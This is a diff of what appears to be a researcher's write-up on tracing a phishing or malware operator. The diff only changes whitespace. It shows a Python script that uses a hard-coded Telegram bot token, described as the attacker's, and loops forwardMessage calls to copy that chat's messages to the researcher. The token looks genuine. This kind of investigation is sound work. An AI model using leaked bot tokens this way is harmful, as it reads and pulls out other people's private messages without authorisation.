@@ -27,21 +27,17 @@ Craft a script to find telegram bot name:
 ```python
 import requests
 
-
 BOT   = "8730354227:AAGNzcTfCMxNG-w_FDO-rZkqDyVeLMLK4l4"
 ATTACKER_CHAT = "1421332625"  # lalalala3215's chat
 base  = f"https://api.telegram.org/bot{BOT}"
 
-
 # Find bot name
 print(requests.get(f"{base}/getMe").json())
-
 
 # Manually message the bot to get a chat_id
 updates = requests.get(f"{base}/getUpdates").json()
 print(updates)
 MY_CHAT_ID = updates["result"][0]["message"]["chat"]["id"]  
-
 
 for msg_id in range(1, 200):
     r = requests.get(f"{base}/forwardMessage", params={
@@ -53,7 +49,6 @@ for msg_id in range(1, 200):
         print(f"✓ Forwarded message {msg_id}: {r}")
     else:
         print(f"✗ {msg_id}: {r['description']}")
-
 ```
 
 I had to run this twice since the first time I had to get the `chat_id` first before plugging it into the script and ran it a second time to forward messages to the attacker’s chat to myself:
